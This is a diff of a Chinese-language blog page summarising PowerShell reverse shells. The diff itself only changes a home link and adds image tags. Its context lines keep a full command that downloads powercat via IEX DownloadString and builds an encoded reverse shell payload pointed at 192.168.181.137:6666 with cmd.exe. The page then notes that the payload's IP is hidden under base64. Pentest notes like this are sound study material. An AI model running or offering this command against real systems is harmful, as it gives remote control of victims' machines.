@@ -37,7 +37,7 @@
     <div id="single">
     <div id="top" style="display: block;">
     <div class="bar" style="width: 0;"></div>
-    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://lw0f.fun"></a>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://Lw0f.github.io"></a>
     <div title="播放/暂停" class="iconfont icon-play"></div>
     <h3 class="subtitle">powershell反连小结</h3>
     <div class="social">
@@ -82,17 +82,17 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -EX bypass  IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>); powercat -c 192.168.181.137 -p 6666 -e cmd.exe -ge &gt; encodedreverseshell.ps1</span><br></pre></td></tr></table></figure>
 
 <p><strong>使用以上命令会生成编码后的反连payload样式如下图</strong></p>
-
+<img src="/2020/06/21/powershell%E5%8F%8D%E8%BF%9E%E5%B0%8F%E7%BB%93/20.png" class>
 
 <p><strong>3、使用powershell -E 执行编码 （要在powershell内执行，在CMD中尝试失败。。。）</strong></p>
+<img src="/2020/06/21/powershell%E5%8F%8D%E8%BF%9E%E5%B0%8F%E7%BB%93/21.png" class>
 
 
 
-
-
+<img src="/2020/06/21/powershell%E5%8F%8D%E8%BF%9E%E5%B0%8F%E7%BB%93/22.png" class>
 
 <p><strong>常规base64解码解出内容如下：（看不出连接IP🙃）</strong></p>
-
+<img src="/2020/06/21/powershell%E5%8F%8D%E8%BF%9E%E5%B0%8F%E7%BB%93/23.png" class>
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                 <source type="audio/mpeg" src="">
